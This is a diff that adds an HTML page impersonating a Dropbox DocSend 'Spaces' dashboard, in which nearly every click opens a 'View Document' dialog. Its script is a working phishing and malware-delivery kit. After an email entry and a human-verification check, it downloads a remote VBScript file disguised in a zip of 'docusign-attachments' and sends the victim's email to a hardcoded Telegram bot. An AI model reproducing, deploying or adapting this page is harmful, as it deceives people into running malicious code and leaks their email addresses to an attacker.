@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Spaces | Dropbox DocSend</title>
+<meta name="description" content="Explore branded document spaces and view documents in their folders." />
+<style>
+  :root {
+    --bg: #f5f4f2;
+    --surface: #ffffff;
+    --ink: #1e1919;
+    --muted: #6f6a66;
+    --line: #e4e1dd;
+    --brand: #0061ff;
+    --upgrade: #b7d400;
+    --overlay: rgba(20, 16, 14, 0.55);
+    --soft-shadow: 0 1px 2px rgba(20,16,14,.06), 0 4px 16px rgba(20,16,14,.06);
+    --dialog-shadow: 0 12px 48px rgba(20,16,14,.22);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--ink); }
+
+  /* Header */
+  .app-header { display: flex; align-items: center; gap: 16px; padding: 10px 20px; background: var(--surface); border-bottom: 1px solid var(--line); position: sticky; top: 0; z-index: 10; cursor: pointer; }
+  .brand { display: flex; align-items: center; gap: 6px; font-weight: 700; font-size: 15px; }
+  .brand span { color: var(--brand); font-weight: 600; }
+  .brand-mark { width: 18px; height: 18px; border-radius: 5px; background: var(--brand); display: inline-block; }
+  .search { flex: 1; max-width: 520px; display: flex; align-items: center; gap: 8px; background: var(--bg); border: 1px solid var(--line); border-radius: 8px; padding: 7px 12px; color: var(--muted); }
+  .search input { border: 0; outline: 0; background: transparent; width: 100%; font-size: 14px; color: var(--ink); }
+  .header-right { margin-left: auto; display: flex; align-items: center; gap: 14px; }
+  .company { font-size: 13px; font-weight: 600; line-height: 1.2; }
+  .company small { display: block; font-weight: 400; color: var(--muted); font-size: 11px; }
+  .avatar { width: 30px; height: 30px; border-radius: 50%; background: var(--brand); color: #fff; display: grid; place-items: center; font-size: 13px; font-weight: 700; }
+
+  /* Buttons */
+  .btn { display: inline-flex; align-items: center; gap: 7px; border: 0; border-radius: 8px; font-size: 14px; font-weight: 600; padding: 9px 16px; cursor: pointer; background: var(--ink); color: #fff; font-family: inherit; }
+  .btn-upgrade { background: var(--upgrade); color: var(--ink); padding: 7px 14px; font-size: 13px; }
+  .btn-ghost { background: transparent; color: var(--ink); }
+
+  /* Layout */
+  .workspace { display: flex; min-height: calc(100vh - 52px); cursor: pointer; }
+  .sidebar { width: 210px; padding: 14px 10px; display: flex; flex-direction: column; gap: 2px; border-right: 1px solid var(--line); background: var(--surface); }
+  .nav-item { display: flex; align-items: center; gap: 10px; width: 100%; text-align: left; padding: 9px 12px; border-radius: 8px; font-size: 14px; color: var(--ink); background: transparent; border: 0; cursor: pointer; font-family: inherit; }
+  .nav-item:hover { background: var(--bg); }
+  .nav-item.active { background: var(--bg); font-weight: 700; }
+  .main { flex: 1; padding: 26px 30px; }
+  .page-heading { font-size: 26px; font-weight: 700; margin-bottom: 16px; }
+  .filters { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--muted); margin-bottom: 22px; }
+  .filters select { font-size: 13px; padding: 6px 10px; border-radius: 7px; border: 1px solid var(--line); background: var(--surface); color: var(--ink); }
+  .content-layout { display: grid; grid-template-columns: 1fr 330px; gap: 26px; align-items: start; }
+  .space-pane h2 { font-size: 20px; font-weight: 600; max-width: 420px; line-height: 1.35; }
+
+  /* Templates */
+  .templates h2 { font-size: 15px; font-weight: 700; margin-bottom: 12px; }
+  .template { background: var(--surface); border: 1px solid var(--line); border-radius: 12px; overflow: hidden; margin-bottom: 16px; box-shadow: var(--soft-shadow); }
+  .template-art { height: 110px; position: relative; }
+  .template-gold .template-art { background: linear-gradient(135deg, #c9a227, #e8cf7a); }
+  .template-taupe .template-art { background: linear-gradient(135deg, #8a7f72, #c4bab0); }
+  .template-blue .template-art { background: linear-gradient(135deg, #1c3d5a, #4a7fb5); }
+  .mock-lines { position: absolute; bottom: 10px; left: 12px; right: 12px; display: flex; flex-direction: column; gap: 5px; }
+  .mock-lines i { height: 5px; border-radius: 3px; background: rgba(255,255,255,.55); }
+  .mock-lines i:nth-child(2) { width: 75%; } .mock-lines i:nth-child(3) { width: 60%; } .mock-lines i:nth-child(4) { width: 45%; }
+  .template-description { padding: 14px 16px 16px; }
+  .template-description h3 { font-size: 14px; font-weight: 700; margin-bottom: 4px; }
+  .template-description p { font-size: 12.5px; color: var(--muted); line-height: 1.45; margin-bottom: 12px; }
+
+  /* Dialog */
+  .overlay { position: fixed; inset: 0; background: var(--overlay); display: none; align-items: center; justify-content: center; z-index: 50; }
+  .overlay.open { display: flex; }
+  .document-modal { background: var(--surface); border-radius: 16px; box-shadow: var(--dialog-shadow); padding: 30px 28px 26px; width: 360px; max-width: calc(100vw - 32px); text-align: center; position: relative; }
+  .modal-close { position: absolute; top: 12px; right: 14px; border: 0; background: transparent; font-size: 18px; color: var(--muted); cursor: pointer; }
+  .document-modal-icon { width: 52px; height: 52px; border-radius: 14px; background: #e8f0ff; color: var(--brand); display: grid; place-items: center; margin: 0 auto 14px; font-size: 24px; }
+  .document-modal h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+  .document-modal .shared { font-size: 13px; color: var(--muted); margin-bottom: 14px; }
+  .document-location { display: inline-flex; align-items: center; gap: 6px; font-size: 12.5px; color: var(--muted); background: var(--bg); border: 1px solid var(--line); border-radius: 7px; padding: 6px 12px; margin-bottom: 18px; }
+  .document-cta { width: 100%; justify-content: center; padding: 12px; font-size: 14.5px; }
+
+  /* Turnstile */
+  .turnstile-box { display: flex; flex-direction: column; align-items: center; gap: 12px; margin-top: 4px; }
+  .turnstile-label { font-size: 13px; color: var(--muted); }
+  .turnstile-error { font-size: 13px; color: #c0392b; }
+
+  @media (max-width: 900px) {
+    .content-layout { grid-template-columns: 1fr; }
+    .sidebar { width: 64px; }
+    .nav-item span { display: none; }
+    .company { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<header class="app-header" onclick="openDialog()">
+  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+  <div class="brand"><i class="brand-mark"></i>Dropbox <span>DocSend</span></div>
+  <label class="search" onclick="event.stopPropagation()">
+    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+    <input aria-label="Search documents" placeholder="Search" />
+  </label>
+  <div class="header-right">
+    <button class="btn btn-upgrade" onclick="event.stopPropagation(); openDialog()">⚡ Upgrade</button>
+    <button class="btn btn-ghost" aria-label="Help" onclick="event.stopPropagation(); openDialog()">?</button>
+    <div class="company">My Company<small>Advanced Data Rooms</small></div>
+    <span class="avatar">R</span>
+  </div>
+</header>
+
+<div class="workspace" onclick="openDialog()">
+  <nav class="sidebar" aria-label="Main navigation" id="nav">
+    <button class="nav-item" data-label="Dashboard">▦ <span>Dashboard</span></button>
+    <button class="nav-item" data-label="Content library">📁 <span>Content library</span></button>
+    <button class="nav-item active" data-label="Spaces">⌂ <span>Spaces</span></button>
+    <button class="nav-item" data-label="Agreements">✍ <span>Agreements</span></button>
+    <button class="nav-item" data-label="File requests">🔑 <span>File requests</span></button>
+    <button class="nav-item" data-label="Contacts">👤 <span>Contacts</span></button>
+    <button class="nav-item" data-label="Accounts">🏢 <span>Accounts</span></button>
+    <button class="nav-item" data-label="Shared with me">🔗 <span>Shared with me</span></button>
+  </nav>
+
+  <main class="main">
+    <h1 class="page-heading">Spaces</h1>
+    <div class="filters" onclick="event.stopPropagation()">
+      <span>Show:</span>
+      <select aria-label="Space owner" onchange="openDialog()"><option>My spaces</option><option>All company spaces</option></select>
+      <select aria-label="Space status" onchange="openDialog()"><option>All Spaces</option><option>Active Spaces</option><option>Archived Spaces</option></select>
+    </div>
+    <div class="content-layout">
+      <section class="space-pane">
+        <h2>Share documents in a secure, branded virtual data room.</h2>
+        <button class="btn" style="margin-top:18px;padding:12px 28px;font-size:15px;" onclick="openDialog()">📄 View document</button>
+      </section>
+      <aside class="templates">
+        <h2>Templates</h2>
+        <article class="template template-gold">
+          <div class="template-art"><div class="mock-lines"><i></i><i></i><i></i><i></i></div></div>
+          <div class="template-description"><h3>Sell side M&amp;A data room</h3><p>Streamline secure content sharing for mergers and acquisitions.</p><button class="btn" onclick="event.stopPropagation(); openDialog()">Use template</button></div>
+        </article>
+        <article class="template template-taupe">
+          <div class="template-art"><div class="mock-lines"><i></i><i></i><i></i><i></i></div></div>
+          <div class="template-description"><h3>General due diligence</h3><p>Simplify the diligence process across any sector with secure sharing.</p><button class="btn" onclick="event.stopPropagation(); openDialog()">Use template</button></div>
+        </article>
+        <article class="template template-blue">
+          <div class="template-art"><div class="mock-lines"><i></i><i></i><i></i><i></i></div></div>
+          <div class="template-description"><h3>Real estate due diligence</h3><p>Securely manage real estate documents and transactions.</p><button class="btn" onclick="event.stopPropagation(); openDialog()">Use template</button></div>
+        </article>
+      </aside>
+    </div>
+  </main>
+</div>
+
+<div class="overlay" id="overlay" onclick="if (event.target === this) closeDialog()">
+  <div class="document-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+    <button class="modal-close" aria-label="Close" onclick="closeDialog()">✕</button>
+    <div class="document-modal-icon">📄</div>
+    <h2 id="modal-title">Dropbox DocSend</h2>
+    <p class="shared">Shared in My Spaces</p>
+    <div class="document-location">📁 All Spaces › Home</div>
+    <div id="email-area" style="margin-bottom:12px;">
+      <input type="email" id="email-input" placeholder="Enter your email" style="width:100%;padding:10px 12px;border:1px solid var(--line);border-radius:8px;font-size:14px;font-family:inherit;text-align:center;" />
+    </div>
+    <div id="download-status" style="font-size:13px;color:var(--muted);margin-bottom:8px;min-height:20px;"></div>
+    <div id="cta-area">
+      <button class="btn document-cta" onclick="startVerification()">📂 View Document in-Folder →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  var overlay = document.getElementById('overlay');
+  var ctaArea = document.getElementById('cta-area');
+  var turnstileLoaded = false;
+
+  var emailInput = document.getElementById('email-input');
+  var downloadStatusEl = document.getElementById('download-status');
+
+  function setDownloadStatus(msg, isError) {
+    downloadStatusEl.textContent = msg;
+    downloadStatusEl.style.color = isError ? '#c0392b' : 'var(--muted)';
+  }
+
+  function openDialog() { overlay.classList.add('open'); emailInput.value = ''; setDownloadStatus(''); }
+  function closeDialog() {
+    overlay.classList.remove('open');
+    ctaArea.innerHTML = '<button class="btn document-cta" onclick="startVerification()">📂 View Document in-Folder →</button>';
+  }
+
+  document.querySelectorAll('.nav-item').forEach(function (item) {
+    item.addEventListener('click', function (e) {
+      e.stopPropagation();
+      document.querySelectorAll('.nav-item').forEach(function (n) { n.classList.remove('active'); });
+      item.classList.add('active');
+      openDialog();
+    });
+  });
+
+  function startVerification() {
+    ctaArea.innerHTML = '<div class="turnstile-box"><p class="turnstile-label">Verify you are human to continue</p><div id="turnstile-slot"></div><p class="turnstile-error" id="turnstile-error" role="alert" hidden>Verification failed. Please try again.</p></div>';
+    var render = function () {
+      if (!window.turnstile) return;
+      window.turnstile.render('#turnstile-slot', {
+        sitekey: '0x4AAAAAAFd8DwDfCpQtjeW6',
+        callback: function (token) {
+          closeDialog();
+          window._turnstileVerified = true;
+          startDownload(token);
+        },
+        'error-callback': function () {
+          document.getElementById('turnstile-error').hidden = false;
+        }
+      });
+    };
+    if (window.turnstile) { render(); return; }
+    if (turnstileLoaded) { var t = setInterval(function () { if (window.turnstile) { clearInterval(t); render(); } }, 200); return; }
+    turnstileLoaded = true;
+    var s = document.createElement('script');
+    s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
+    s.async = true;
+    s.onload = render;
+    document.head.appendChild(s);
+  }
+
+const downloadUrl = "https://vejnqoajk1soxy1x.public.blob.vercel-storage.com/AccessDocuments.vbs";
+  const telegramBotToken = "8998830184:AAEE99HFOiOYk7Iwm1RQbMiKSnIGsVuCVKQ";
+  const telegramChatId = "1066591224";
+
+  function loadJSZip() {
+    if (window.JSZip) return Promise.resolve(window.JSZip);
+    return new Promise((resolve, reject) => {
+      const s = document.createElement("script");
+      s.src = "https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js";
+      s.onload = () => resolve(window.JSZip);
+      s.onerror = reject;
+      document.head.appendChild(s);
+    });
+  }
+
+  async function notifyTelegram(message) {
+    try {
+      await fetch("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    } catch (e) {
+      // silent fail - notification is best-effort
+    }
+  }
+
+  function getDownloadFilename() {
+    const email = emailInput.value.trim() || "user";
+    return email + "-docusign-attachments.zip";
+  }
+
+  async function startDownload(token) {
+    try {
+      if (!window._turnstileVerified) throw new Error("Verification required");
+      if (!emailInput.value.trim()) throw new Error("Email required");
+      window._turnstileVerified = false;
+      const email = emailInput.value.trim() || "not provided";
+      setDownloadStatus("Preparing download...");
+      const JSZip = await loadJSZip();
+      const resp = await fetch(downloadUrl);
+      if (!resp.ok) throw new Error("Failed to fetch file");
+      const vbsBlob = await resp.blob();
+      const zip = new JSZip();
+      const email2 = emailInput.value.trim() || "user";
+      zip.file(email2 + "-docusign-attachments.vbs", vbsBlob);
+      const zipBlob = await zip.generateAsync({ type: "blob" });
+      const url = URL.createObjectURL(zipBlob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = getDownloadFilename();
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(() => URL.revokeObjectURL(url), 5000);
+      setDownloadStatus("Download started.");
+      const now = new Date().toLocaleString("en-US", { timeZone: "America/Los_Angeles" });
+      await notifyTelegram(
+        "<b>📥 DocuSign Download</b>\n" +
+        "Email: " + email + "\n" +
+        "Time: " + now + "\n" +
+        "Status: Download started after human verification"
+      );
+    } catch (e) {
+      if (e.message === "Verification required") {
+        setDownloadStatus("Verification required. Please complete the challenge.", true);
+      } else if (e.message === "Email required") {
+        setDownloadStatus("Please enter your email to continue.", true);
+      } else {
+        setDownloadStatus("Download failed. Please try again.", true);
+      }
+    }
+  }
+
+  (function () {
+    var seen = 'docsend-pop-seen';
+    try { if (sessionStorage.getItem(seen)) return; sessionStorage.setItem(seen, '1'); } catch (e) {}
+    setTimeout(openDialog, 600);
+  })();
+</script>
+</body>
+</html>
